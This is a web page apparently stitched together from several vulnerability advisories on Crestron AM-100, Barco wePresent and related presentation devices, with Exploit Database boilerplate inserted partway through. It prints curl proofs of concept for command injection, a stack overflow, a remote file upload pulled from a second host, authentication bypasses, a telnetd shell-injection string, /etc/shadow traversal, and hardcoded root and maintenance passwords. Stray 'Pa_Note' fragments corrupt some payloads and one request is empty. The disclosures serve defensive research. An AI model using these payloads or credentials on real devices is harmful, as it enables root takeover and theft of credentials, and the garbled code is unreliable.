# OEM Presentation Platform Vulnerabilities

Critical

[← View More Research Advisories](/security/research)
### Synopsis

Tenable found multiple vulnerabilities while investigating a Crestron AM-100. Tenable also discovered that the Crestron AM-100 shared a code base with the Barco wePresent, Extron ShareLink, InFocus LiteShow, TEQ AV IT WIPS710, SHARP PN-L703WA, Optoma WPS-Pro, Blackbox HD WPS, and possibly others. The vulnerabilities listed below **do not** affect all devices. Tenable has done its best to specifically call out which platforms are affected by each vulnerability.

#### CVE-2019-3925: SNMP Command Injection #1

A remote, unauthenticated attacker can inject operating system commands on the Crestron AM-100 with firmware 1.6.0.2 and AM-101 with firmware 2.7.0.2. The vulnerability occurs over SNMP via the iso.3.6.1.4.1.3212.100.3.2.9.3 OID. The command injection is the result of shelling out to */bin/ftpfw.sh*.

#### CVE-2019-3927: Unauthenticated Admin Password Change via SNMP

A remote, unauthenticated attacker can change the admin and moderator passwords for the web interface on the Crestron AM-100 with firmware 1.6.0.2 and AM-101 with firmware 2.7.0.2. The vulnerability occurs over SNMP via the iso.3.6.1.4.1.3212.100.3.2.8.1 and iso.3.6.1.4.1.3212.100.3.2.8.2 OIDs. The following proof of concept shows the user logging in with the default "admin" password and then with the a new password.

#### CVE-2019-3929: Unauthenticated Remote Command Injection via HTTP

A remote, unauthenticated attacker can execute operating system commands as root via crafted requests to the HTTP endpoint file\_transfer.cgi. This vulnerability appears to affect all known devices including the Crestron AM-100 firmware 1.6.0.2, Crestron AM-101 firmware 2.7.0.1, Barco wePresent WiPG-1000 firmware 2.3.0.10, Barco wePresent WiPG-1600 before firmware 2.4.1.19, Extron ShareLink 200/250 firmware 2.0.3.4, Teq AV IT WIPS710 firmware 1.1.0.7, SHARP PN-L703WA firmware 1.4.2.3, Optoma WPS-Pro firmware 1.0.0.5, Blackbox HD WPS firmware 1.0.0.5, InFocus LiteShow3 firmware 1.0.16, and InFocus LiteShow4 2.0.0.7

![](/sites/drupal.dmz.tenablesecurity.com/files/files/advisory/cve_2019_3929.png)
#### CVE-2019-3930: Unauthenticated Remote Stack Buffer Overflow via HTTP

The function **PARSERtoCHAR** in *libAwCgi.so* is called by the HTTP cgi scripts in multiple contexts. Sometimes without authentication (file\_transfer.cgi) and sometimes with authentication (return.cgi). CGI scripts that pass this function input that exceeds 0x100 bytes overflow a stack buffer. The following proof of concept shows a remote, unauthenticated attacker triggering this bug.

```

curl -v --header "Content-Type: application/x-www-form-urlencoded" \
--request POST \
--data "file_transfer=new&dir=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaPa_NoteaaaaaaaaaaaaaaPa_Noteaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
--insecure https://192.168.88.250/cgi-bin/file_transfer.cgi

```

Which generates the following back trace:

```

Core was generated by `/home/boa/cgi-bin/file_transfer.cgi'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x61616160 in ?? ()

#2  0x61616160 in ?? ()
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
(gdb)

```

This vulnerability appears to affect all known devices including the Crestron AM-100 firmware 1.6.0.2, Crestron AM-101 firmware 2.7.0.1, Barco wePresent WiPG-1000 firmware 2.3.0.10, Barco wePresent WiPG-1600 before firmware 2.4.1.19, Extron ShareLink 200/250 firmware 2.0.3.4, Teq AV IT WIPS710 firmware 1.1.0.7, SHARP PN-L703WA firmware 1.4.2.3, Optoma WPS-Pro firmware 1.0.0.5, Blackbox HD WPS firmware 1.0.0.5, InFocus LiteShow3 firmware 1.0.16, and InFocus LiteShow4 2.0.0.7.

#### CVE-2019-3931: Authenticated Remote File Upload via HTTP

The Crestron AM-100 1.6.0.2 and AM-101 2.7.0.1 received a patch to fix CVE-2017-16709. The patch attempted to filter out operating system commands to prevent command injection. However, this patch was not entirely successful and authenticated attackers can still provide arbitrary parameters to curl. This allows authenticated attackers to upload any file to the device. Furthermore, the /home/boa/cgi-bin/ directory is writeable which allows the attacker to easily achieve code execution.

The following proof of concept:

```

curl --header "Content-Type: application/x-www-form-urlencoded" \
--request POST \
--data "command=<Send><seid>fAEI0CHTDTHKcDVD</seid><upload><protocol>ftp</protocol><address>http://192.168.88.248:1270Pa_Note http://192.168.88.248:1270/lol.cgi -o /home/boa/cgi-bin/file_transfer.cgi</address><port>1270</port><account>lol</account><password>lol</password><logo>/tmp/wat</logo></upload></Send>" \
--insecure https://192.168.88.250/cgi-bin/return.cgi

```

Will cause the following command to be executed on the device:

```

sh /usr/bin/curl -k -o /tmp/Example.ogg http://192.168.88.248:1270; http://192.168.88.248:1270/lol.cgi -o /home/boa/cgi-bin/file_transfer.cgi

```

Where lol.cgi is the file to upload and file\_transfer.cgi is the file to overwrite

#### CVE-2019-3932: Authentication Bypass in return.tgi

The *return.tgi* script in */home/boa/tgi/* allows remote attackers to bypass authentication with a hardcoded sessionID of **trLVy9Gh82KDHoy** on the Crestron AM-100 with firmware 1.6.0.2 and AM-101 with firmware 2.7.0.2. The return.tgi controls external devices via the uart\_bridge. A sample bypass follows:

```

curl --header "Content-Type: application/x-www-form-urlencoded" \
--request POST \
--data "command=session&trLVy9Gh82KDHoy9&beef100500    2222010005"
--insecure https://192.168.88.250/tgi/return.tgi

```
#### CVE-2019-3933: Remote View Login Bypass #1

An unauthenticated, remote attacker can bypass the remote view "login" (pictured in CVE-2019-3928) simply by navigating to *http://[ip address]/images/browserslide.jpg*. The final image of a screenshare will also be cached at that location even after the presentation has finished. If a presentation has not occurred since a reboot then this page will be a 404. This vulnerability is known to affect the Crestron AM-100 firmware 1.6.0.2 and Crestron AM-101 firmware 2.7.0.1.

![](/sites/drupal.dmz.tenablesecurity.com/files/files/advisory/cve_2019_3933.png)
#### CVE-2019-3934: Remove View Login Bypass #2

An unauthenticated, remote attacker can bypass the remote view "login" (pictured in CVE-2019-3928) and down slide images by executing the following HTTP request:

```

curl --header "Content-Type: application/x-www-form-urlencoded" \
--request POST \
--data "BROWSER=client" \
--insecure "https://192.168.88.250/cgi-bin/login.cgi?lang=en&src=lol.html" > slideshow_img.jpg

```

This vulnerability is known to affect the Crestron AM-100 firmware 1.6.0.2 and Crestron AM-101 firmware 2.7.0.1

#### CVE-2019-3935: Unauthenticated Remote Moderator Controls

An unauthenticated, remote attacker can stop, start, and disconnect any screen sharing session due to insufficient authentication checking in the moderator controls. The following commands demonstrate this functionality in the Crestron AM-100 firmware 1.6.0.2 and Crestron AM-101 firmware 2.7.0.1. Note that the first request provides the attacker with the "primary key" for the screen share session.

```

albinolobster@ubuntu:~$ curl --header "Content-Type: application/x-www-form-urlencoded" --request POST --data "conference" --insecure "https://192.168.88.250/cgi-bin/conference.cgi?lang=en&src=lol.html"
3000192.168.88.24741
albinolobster@ubuntu:~$ curl --header "Content-Type: application/x-www-form-urlencoded" --request POST --data "userid=4&action=Stop" --insecure "https://192.168.88.250/cgi-bin/conference.cgi?lang=en&src=lol.html"
success
albinolobster@ubuntu:~$ curl --header "Content-Type: application/x-www-form-urlencoded" --request POST --data "userid=4&action=PlayImage" --insecure "https://192.168.88.250/cgi-bin/conference.cgi?lang=en&src=lol.html"
success
albinolobster@ubuntu:~$ curl --header "Content-Type: application/x-www-form-urlencoded" --request POST --data "userid=4&action=Disconnect" --insecure "https://192.168.88.250/cgi-bin/conference.cgi?lang=en&src=lol.html"
success

```
#### CVE-2019-3936: Unauthenticated Remote View Denial of Service

An unauthenticated, remote attacker can stop a screen share by sending the string *wppcmd\x00\x00\xa0\x00\x00\x00* to TCP port 389. The request takes about 2 minutes to go through, but after that time period the screen share transitions into the "Stopped" state.

#### CVE-2019-3937: Credentials Stored in Plaintext

The file */tmp/scfgdndf* stores usernames, passwords, and more in plaintext. Maybe under normal circumstances this wouldn't be too concerning, but with multiple unauthenticated vulnerabilities affecting the devices, including a file inclusion vulnerability, this becomes more concerning. The following is a sample of the files contents. Note that "modpass" and "adminpass" were the passwords in use at the time of dumping this file.

```

  /tmp # strings /tmp/scfgdndf
  WPS820 100111101110001
  Crestron AirMedia
  WiPG1K5s
  8888
  #FFFFFF
  AirMedia-0e58c9
  default
  AM-100
  user
  trainer
  admin
  sh -b 0.0.0.0:1270
  private
  user
  authpass
  privpass
  public
  GMT-8_CH
  0.0.0.0
  modpass
  adminpass
  http://192.168.88.253:1270;telnetd -l /bin/sh -b 0.0.0.0:1270

```

This vulnerability is known to affect the Crestron AM-100 firmware 1.6.0.2 and Crestron AM-101 firmware 2.7.0.1.

#### CVE-2019-3938: Exported Credentials Recoverable

The platform allows the administrator to export and import configuration files. The device stores user credentials in the configuration file. The configuration file is easily decoded using the vendor's **awenc** tool. After decoding, the admin password is revealed ("lolwat" in the PoC below). This vulnerability is known to affect the Crestron AM-100 firmware 1.6.0.2 and Crestron AM-101 firmware 2.7.0.1.

```

albinolobster@ubuntu:~$ sudo chroot . ./qemu-arm-static /bin/awenc -h

```
#### CVE-2019-3939: Default Credentials

The devices use the default credentials "admin:admin" for the admin user and "moderator:moderator" for the moderator user.

#### CVE-2017-16709: Authenticated Command Injection

In June 2018, Crestron patched an authenticated, remote command injection vulnerability which was assigned [CVE-2017-16709](https://nvd.nist.gov/vuln/detail/CVE-2017-16709). Through patch analysis, Tenable believes this vulnerability is a command injection via HTTP. Analysis of the other devices indicated they had **not** patched this vulnerability.

### Solution

At the time of publication, Barco has released firmware updates for their [WiPG-1000P](https://www.barco.com/en/support/software/R33050103?majorVersion=2&minorVersion=3&patchVersion=2&buildVersion=20) and [WiPG-1600W](https://www.barco.com/en/support/software/R33050104?majorVersion=2&minorVersion=4&patchVersion=1&buildVersion=19) systems. Extron has also published a [firmware](https://www.extron.com/download/software.aspx?filehandle=sharelink200&material=44&type=archive) update.

#### Description

Crestron AM-100 with firmware 1.6.0.2 and AM-101 with firmware 2.7.0.2 stores usernames, passwords, and other configuration options in the file generated via the "export configuration" feature. The configuration file is encrypted using the awenc binary. The same binary can be used to decrypt any configuration file since all the encryption logic is hard coded. A local attacker can use this vulnerability to gain access to devices username and passwords.

Description:
The Crestron AirMedia AM-100 with firmware versions v1.1.1.11 - v1.2.1 is vulnerable to multiple issues.

1) Path Traversal

GET request:
http://[AM-100-ADDRESS]/cgi-bin/login.cgi?lang=en&src=../../../../../../../../../../../../../../../../../../../../etc/shadow

2) Hidden Management Console

http://[AM-100-ADDRESS]/cgi-bin/login_rdtool.cgi
The AM-100 has a hardcoded default credential of rdtool::mistral5885
This interface contains the ability to upload arbitrary files (RD upload) and can enable a telnet server that runs on port 5885 (RD Debug mode).

3) Hardcoded credentials

The default root password for these devices is root::awind5885
Valid login sessions for the default (non-debugging) management interface are stored on the filesystem as session01, session02.. etc. Cleartext credentials can be read directly from these files.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Security Advisory: Multiple vulnerabilities in WePresent WiPG devices
--------------------------------------------------------------------------------
1. Summary
This advisory describes multiple vulnerabilities affecting the WePresent WiPG
devices. Most of the issues covered by this advisory apply to the WiPG-1000,
WiPG-1500 and the WiPG-2000. The vulnerabilities allow an unauthenticated
attacker within the same network as the device to gain administrative access to
its web interface as well as executing arbitrary code with root privileges on
the device.
2. Vulnerable devices and versions
All vulnerabilities have been discovered on the WiPG-1000 device and are likely
to be present on the WiPG-1500 and WiPG-2000 as well but this has not been
verified in all cases. The most current version of the firmware (2.0.0.7 at the
time of writing) was used for the vulnerability research but quick cross-checks
have indicated that many vulnerabilities were present in much older firmware
versions as well.
3. Details
3.1 Web Interface Authentication Bypass
The login.cgi script contains the hardcoded password 'aw%root?' (without quotes)
for the administration area, which allows anyone with access to the network (or
anyone if the device is exposed to the internet) to log in without knowing the
password set by the regular administrator. This is problematic as the
administration area should not be accessible by anyone not in possession of the
correct password. In addition it should be noted, that it's not possible for any
user to change this password which makes it impossible to change this
administrative password except for applying a firmware patch that doesn't
include this issue.
Note: This backdoor does not appear to be present in the WiPG-2000 device.
3.2 Web Interface Privilege Escalation
When changing the administrator's password in the web form the following request
is sent:
---
POST /cgi-bin/return\_test.cgi HTTP/1.1
Host: 192.168.100.10
Content-Length: 96
Cache-Control: no-cache
Origin: http://192.168.100.10
User-Agent: Agent
Content-Type: application/x-www-form-urlencoded
Accept: \*/\*
DNT: 1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8,de;q=0.6
Connection: close
command=Y5orvHOhpS3nxe9eLONG\_ADMIN\_PWD
newpassword
---
If one logs into the conference control panel on the web UI and then sends this
exact request but inserts their own session ID (which is easily visible in the
URL after logging in) instead, the password will be changed to the new value,
allowing the attacker to login as administrator and thus escalate the user's
privileges.
Note: The underlying issue here is that the session management does not
differentiate between administrative and moderator users. Instead this
difference is handled entirely on the UI level by not showing moderator users
direct links to administrative pages. Their session is valid for administrative
access, however.
3.3 Authentication Bypass
The return\_test.cgi file (/home/boa/cgi-bin/return\_test.cgi) handles various
user requests, such as updating device preferences (or indeed changing passwords
as seen in the previously described vulnerability), which sends a request in a
pseudo-XML format, the first field of which is value and contains
the current session ID, which is used to verify whether the request came from a
legitimate user. If we manipulate the request and instead of the string
'session-id-here' send the string
'SetFlag' the device will omit the session ID check for
this request and handles the request as though it came from an authenticated
user. See below for a full proof of concept request:
---
POST /cgi-bin/return\_test.cgi HTTP/1.1

3.4 OS Command Injection
The rdfs.cgi (/home/boa/cgi-bin/rdfs.cgi) script is vulnerable to command
injection. A specifically crafted string in the web form leads to arbitrary
shell commands being executed on the device with root privileges. As a simple
proof of concept insert the string `; reboot;` into the input field and press
the download button. The device will execute the command and reboots. The cause
of this vulnerability is that the string given by the user is inserted into the
following command which is then executed: '/bin/awenc -e -i %s -o %s' See below
for a full proof of concept request:
---
POST /cgi-bin/rdfs.cgi HTTP/1.1
Host: 192.168.100.10
Content-Length: 37
Cache-Control: max-age=0
Origin: http://192.168.100.10

User-Agent: Agent
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
DNT: 1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8,de;q=0.6
Connection: close
Client=%3Breboot%3B&Download=Download
---
Note: This script is assumed to be a development leftover as it doesn't appear
to be ever presented to end users in any way during normal usage. If this is the
case it should be removed from the system entirely.
3.5 Arbitrary File Disclosure
The rdfs.cgi (/home/boa/cgi-bin/rdfs.cgi) script's intended functionality is to
download an arbitrary file from the device. The encryption that is in place (the
call to the /bin/awenc binary as seen in the command injection vulnerability
above) is too weak to be any significant obstacle in exploiting this
vulnerability.
The encryption can easily be reversed by removing the first 512 bytes of an
encrypted file and then shifting the leftover bytes by the hex values of the
hardcoded key, which is '28825885"(("%((%mistral28825885' (without the single
quotes).
As there is no limitation on what file can be downloaded by using this feature,
an attacker could download any file in an encrypted form and then easily decrypt
its contents. This is particularly interesting as an attacker can read the
cleartext passwords chosen for the admin and moderator users as well as the WiFi
key by downloading the file '/tmp/scfgdndf'.
3.6 File Inclusion
The 'login.cgi' (/home/boa/cgi-bin/login.cgi) contains a file inclusion
vulnerability in the 'src' parameter. The file inclusion only appears to be
working for files meeting certain criteria however, returning a 502 error for
other files. The URL
'http://192.168.100.10/cgi-bin/login.cgi?lang=en&src=../../../bin/mountstor.sh'
can be used as proof of concept. This vulnerability doesn't appear to have any
severe impact as we weren't able to read any files containing information that
couldn't be gained by simply extracting them from the firmware.
3.7 Insecure Maintenance Interface
Requesting the url
'http://192.168.100.10/cgi-bin/login.cgi?lang=en&src=AwLoginRdtool.html' leads
to a login page being served by the 'login.cgi' file, which allows anyone to log
in as 'rdtool' using the hardcoded password 'mistral5885'. Once logged in, one
can enable 'manufacture mode' or 'RD Debug mode', which enables the Telnet
service on the device. The researchers were unable to discover the password for
the root account during the time spent on this research, however anyone in
possession of the password can enable Telnet and get a shell with root
privileges on the device.
